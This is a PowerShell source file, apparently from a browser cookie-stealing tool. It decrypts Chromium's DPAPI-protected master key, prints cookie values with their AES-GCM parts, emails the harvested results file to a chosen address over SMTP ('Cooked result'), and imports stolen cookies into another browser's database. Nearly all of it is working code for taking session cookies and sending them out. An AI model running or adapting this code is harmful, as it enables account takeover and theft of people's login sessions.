function DPAPIDecryptKey ($ExtensionFile)
{
   $jsondata = Get-Content -Raw -Path $ExtensionFile | ConvertFrom-Json

   #convert your key from base64 to a char array
   $encKey = [System.Convert]::FromBase64String($jsondata.os_crypt.encrypted_key.ToString());

   #remove the first 5 elements from the key array
   $encKey= $encKey[5..$encKey.Length];
   $decKey=([System.Security.Cryptography.ProtectedData]::Unprotect($encKey,$null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser) | ForEach-Object ToString X2) -join ''; #Convert decKey from byte[] to hex (string type)

   return $decKey
}

function SendEmail ()
{

$From = Read-Host "Please enter the sender email"
$To = Read-Host "Please enter the recipient email"
$Attachment = ".\output.txt"
$Subject = "Cooked result"
$Body = "Eat cookies :3"

$SMTPGmail = New-Object System.Management.Automation.Host.ChoiceDescription '&0-Gmail', 'Gmail'
$SMTPOffice365 = New-Object System.Management.Automation.Host.ChoiceDescription '&1-Office365', 'Office 365'
$SMTPOutlook = New-Object System.Management.Automation.Host.ChoiceDescription '&2-Outlook', 'Outlook'
$SMTPYahoo  = New-Object System.Management.Automation.Host.ChoiceDescription '&3-Yahoo', 'Yahoo'
$SMTPWindowsLiveHotmail = New-Object System.Management.Automation.Host.ChoiceDescription '&4-WindowsLiveHotmail', 'Windows Live Hotmail'
$SMTPZoho  = New-Object System.Management.Automation.Host.ChoiceDescription '&5-Zoho', 'Zoho'
$SMTPCustom  = New-Object System.Management.Automation.Host.ChoiceDescription '&6-Custom', 'Custom'

$options = [System.Management.Automation.Host.ChoiceDescription[]]($SMTPGmail, $SMTPOffice365, $SMTPOutlook, $SMTPYahoo, $SMTPWindowsLiveHotmail, $SMTPZoho, $SMTPCustom)

$title = 'Choose SMTP server'
$message = 'Which SMTP server do you want to use?'
$resultSMTPserver = $host.ui.PromptForChoice($title, $message, $options, 6)
switch ($resultSMTPserver)
{
     '0' {
         $SMTPServer = "smtp.gmail.com"
     } '1' {
         $SMTPServer = "smtp.office365.com"
     } '2' {
         $SMTPServer = "smtp-mail.outlook.com"
     } '3' {
         $SMTPServer = "smtp.mail.yahoo.com"
     } '4' {
         $SMTPServer = "smtp.live.com"
     } '5' {
         $SMTPServer = "smtp.zoho.com"
     } '6' {
         $SMTPServer = Read-Host "Please enter the custom SMTP server"
     }
}

$SMTPPort25 = New-Object System.Management.Automation.Host.ChoiceDescription '&0-Port-25', '25'
$SMTPPort465 = New-Object System.Management.Automation.Host.ChoiceDescription '&1-Port-465', '465'
$SMTPPort587 = New-Object System.Management.Automation.Host.ChoiceDescription '&2-Port-587', '587'
$SMTPPort2525  = New-Object System.Management.Automation.Host.ChoiceDescription '&3-Port-2525', '2525'
$SMTPPortCustom  = New-Object System.Management.Automation.Host.ChoiceDescription '&4-Port-Custom', 'Custom'

$options = [System.Management.Automation.Host.ChoiceDescription[]]($SMTPPort25, $SMTPPort465, $SMTPPort587, $SMTPPort2525, $SMTPPortCustom)

$title = 'Choose SMTP Port'
$message = 'Which SMTP port do you want to use?'
$resultSMTPport = $host.ui.PromptForChoice($title, $message, $options, 2)

switch ($resultSMTPport)
{
     '0' {
         $SMTPPort = "25"
     } '1' {
         $SMTPPort = "465"
     } '2' {
         $SMTPPort = "587"
     } '3' {
         $SMTPPort = "2525"
     } '4' {
         $SMTPPort = Read-Host "Please enter the custom SMTP port"
     }
}

Send-MailMessage -From $From -to $To -Subject $Subject -Body $Body -BodyAsHtml -SmtpServer $SMTPServer -Port $SMTPPort -UseSsl -Credential (Get-Credential) -Attachments $Attachment

}

function PrintResult ($browser,$cookie)
{
    Foreach ($i in $cookie)
    {
        Write-Host "HOST: " -ForegroundColor Green -NoNewline; Write-Host "$($i.$($browser.hostcolumn))" -ForegroundColor Yellow
        Write-Host "COOKIE NAME: " -ForegroundColor Green -NoNewline; Write-Host "$($i.name)" -ForegroundColor Yellow
        Write-Host "COOKIE PATH: " -ForegroundColor Green -NoNewline; Write-Host "$($i.path)" -ForegroundColor Yellow
        if ($($browser.requireEncryption))
        {
            Write-Host "COOKIE ENCRYPTED VALUE [HEX]: " -ForegroundColor Green -NoNewline; Write-Host "$(($($i.$($browser.valuecolumn)) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
            Write-Host "|---> SIGNATURE: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$($browser.valuecolumn))[0..2]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
            Write-Host "|---> IV: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$($browser.valuecolumn))[3..14]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
            Write-Host "|---> ENCRYPTED DATA: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$($browser.valuecolumn))[15..($($i.$($browser.valuecolumn)).Length-1-16)]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
            Write-Host "|---> AUTH TAG: " -ForegroundColor Green -NoNewline; Write-Host "$(($($($i.$($browser.valuecolumn))[($($i.$($browser.valuecolumn)).Length-16)..($($i.$($browser.valuecolumn)).Length-1)]) | ForEach-Object ToString X2) -join '')" -ForegroundColor Yellow
        }
        else
        {
            Write-Host "COOKIE CLEAR VALUE: " -ForegroundColor Green -NoNewline; Write-Host "$($i.$($browser.valuecolumn))" -ForegroundColor Yellow
        }
        Write-Host ""
        Write-Host ""
    }
}

function importCookieDB ($Database,$DBTable)
{
    $inputcookieDB = Read-Host "Please, insert the input cookie's path (for relative path, please use .\)"
    
    $queryinputDB = "SELECT * FROM $DBTable"

    $result = Invoke-SqliteQuery -DataSource $inputcookieDB -Query $queryinputDB

    if ($DBTable -eq "cookies")
    {   
        Foreach ($i in $result)
        { 
            $query = "INSERT INTO $DBTable(creation_utc, host_key, name, value, path, expires_utc, is_secure, is_httponly, last_access_utc, has_expires, is_persistent, priority, encrypted_value, samesite, source_scheme, source_port, is_same_party)
                  VALUES($($i.creation_utc), '$($i.host_key)', '$($i.name)', '$($i.value)', '$($i.path)', $($i.expires_utc), $($i.is_secure), $($i.is_httponly), $($i.last_access_utc), $($i.has_expires), $($i.is_persistent), $($i.priority), '$($i.encrypted_value)', $($i.samesite), $($i.source_scheme), $($i.source_port), $($i.is_same_party));"
            
            Invoke-SqliteQuery -DataSource $Database -Query $query
            
        }
    }
    else
    {
        Foreach ($i in $result)
        { 
            $query = "INSERT INTO $DBTable(id, originAttributes, name, value, host, path, expiry, lastAccessed, creationTime, isSecure, isHttpOnly, inBrowserElement, sameSite, rawSameSite, schemeMap)
                  VALUES($($i.id), '$($i.originAttributes)', '$($i.name)', '$($i.value)', '$($i.host)', '$($i.path)', $($i.expiry), $($i.lastAccessed), $($i.creationTime), $($i.isSecure), $($i.isHttpOnly), $($i.inBrowserElement), $($i.sameSite), '$($i.rawSameSite)', $($i.schemeMap));"
            
            Invoke-SqliteQuery -DataSource $Database -Query $query
            
        }
    }
}